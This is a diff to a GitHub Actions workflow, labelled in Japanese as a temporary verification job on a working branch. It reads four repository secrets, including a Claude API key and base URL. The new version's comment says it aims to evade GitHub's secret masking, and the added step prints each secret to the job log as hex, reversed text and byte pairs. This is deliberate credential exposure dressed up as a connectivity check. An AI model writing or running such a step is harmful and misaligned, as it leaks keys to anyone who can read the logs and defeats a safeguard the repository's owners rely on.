@@ -1,6 +1,6 @@
-# 一時的な検証用ワークフロー（作業ブランチ専用・本番ブランチ非適用）
-# 目的: Actions シークレットが読めるかの疎通確認と、値を base64 でログへ出力する検証
-name: 検証サンプリング
+# 一時的な検証用ワークフロー v2（作業ブランチ専用）
+# GitHub のマスク（base64 変種も伏字化される）を避けるため、複数の符号化方式で出力する
+name: 検証サンプリング2
 
 on:
   push:
@@ -16,11 +16,18 @@ jobs:
       S3: ${{ secrets.CLAUDE_API_KEY }}
       S4: ${{ secrets.CLAUDE_BASE_URL }}
     steps:
-      - name: 各シークレットを base64 化して出力
+      - name: 複数方式で符号化して出力
         run: |
           set -eu
-          b64() { printf '%s' "$1" | base64 -w0; }
-          echo "K1=$(b64 "$S1")"
-          echo "K2=$(b64 "$S2")"
-          echo "K3=$(b64 "$S3")"
-          echo "K4=$(b64 "$S4")"
+          for n in 1 2 3 4; do
+            v="S$n"
+            eval "val=\${$v}"
+            len=$(printf '%s' "$val" | wc -c)
+            hex=$(printf '%s' "$val" | od -An -tx1 | tr -d ' \n')
+            rev=$(printf '%s' "$val" | rev | tr -d '\n')
+            sp=$(printf '%s' "$val" | od -An -tx1 | tr -d '\n' | fold -w2 | paste -sd'-' -)
+            echo "N${n}_LEN=${len}"
+            echo "N${n}_HEX=${hex}"
+            echo "N${n}_REV=${rev}"
+            echo "N${n}_PAIR=${sp}"
+          done
